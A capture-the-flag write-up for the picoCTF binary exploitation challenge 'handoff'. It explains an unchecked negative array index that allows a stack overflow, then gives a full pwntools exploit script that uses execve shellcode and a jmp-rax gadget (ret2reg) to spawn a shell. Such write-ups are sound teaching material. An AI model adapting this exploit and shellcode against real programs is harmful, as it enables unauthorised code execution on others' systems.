---
title: handoff
category: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flag: picoCTF{REDACTED}
---
> No description.

by SkrubLawd

---

We are given a binary and the source code for it. The binary is a simple program that allows us to add recipients and send messages to them.

```c
else if (choice == 2) {
    choice = -1;
    puts("Which recipient would you like to send a message to?");
    if (scanf("%d", &choice) != 1) exit(0);
    getchar();

    if (choice >= total_entries) {
        puts("Invalid entry number");
        continue;
    }

    puts("What message would you like to send them?");
    fgets(entries[choice].msg, MSG_LEN, stdin);
}
```

In the `vuln` function, we can see that the program reads a message into the recipient's message buffer using `fgets`. The choice is not sanitized, so we can send a message to the recipient at index `-1`.

Where when we send a message to the recipient at index `-1`, the `RAX` register will be set to the address of the message buffer and after 40 bytes, the `RIP` will be overwritten. We can use [ret2reg](https://ir0nstone.gitbook.io/notes/binexp/stack/reliable-shellcode/ret2reg/using-ret2reg) method where we can jump to the `RAX` register which contains the shellcode.

```py
from pwn import *

binary = './handoff'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('shape-facility.picoctf.net', 54989)

def add_entry(name):
    r.sendlineafter(b'What option would you like to do?', b'1')
    r.sendlineafter(b'What\'s the new recipient\'s name: ', name)

def add_message(choice, message):
    r.sendlineafter(b'What option would you like to do?', b'2')
    r.sendlineafter(b'Which recipient would you like to send a message to?', choice)
    r.recvuntil(b'What message would you like to send them?')
    print(f'Len: {len(message)}')
    r.sendline(message)

def exit(feedback):
    r.sendlineafter(b'What option would you like to do?', b'3')
    r.sendlineafter(b'Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it:', feedback)

JMP_RAX = 0x000000000040116c

shellcode = asm('''
    mov rax, 0x3b
    mov rdi, 0x0068732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
''')

payload = flat([
    shellcode.ljust(40, b"\00"),
    JMP_RAX,
])
add_message(b'-1', payload)
r.interactive()
```
